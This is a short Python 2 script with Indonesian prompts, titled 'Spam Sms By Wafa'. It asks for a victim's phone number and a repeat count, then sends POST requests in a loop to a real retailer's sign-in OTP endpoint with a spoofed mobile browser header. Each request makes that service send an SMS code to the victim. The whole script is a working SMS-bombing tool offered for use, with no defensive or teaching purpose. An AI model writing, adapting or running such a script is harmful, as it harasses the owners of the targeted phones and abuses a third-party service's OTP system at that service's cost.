import os,sys
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 zpam.py')
from requests.exceptions import ConnectionError

logo = """
======================
Spam Sms By Wafa
======================
"""

def main():
    os.system('clear')
    print logo
    target = raw_input('[+] Nomor Target : ')
    jumlah = int(raw_input('[+] Jumlah Spam : '))
    print
    data = {
    "phone":target,
    }
    headers = {
    "Connection":"keep-alive",
    "User-Agent":"Mozilla/5.0 (Linux; Android 9; Redmi 8A Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    }
    for spam in range(int(jumlah)):
        try:
            https = requests.post('https://cmsapi.mapclub.com/api/signin-otp', data=data, headers=headers)
            if 'error' in https:
                print '[ Spam Sms ] ke nomor ' + target + ' gagal'
            else:
                print '[ Spam Sms ] ke nomor ' + target + ' berhasil'
        except requests.exceptions.ConnectionError:
            print '[!] Tidak ada koneksi'
            sys.exit(2)
    print
    print '[!] Done bosku'
    sys.exit()

if __name__ == '__main__':
    main()
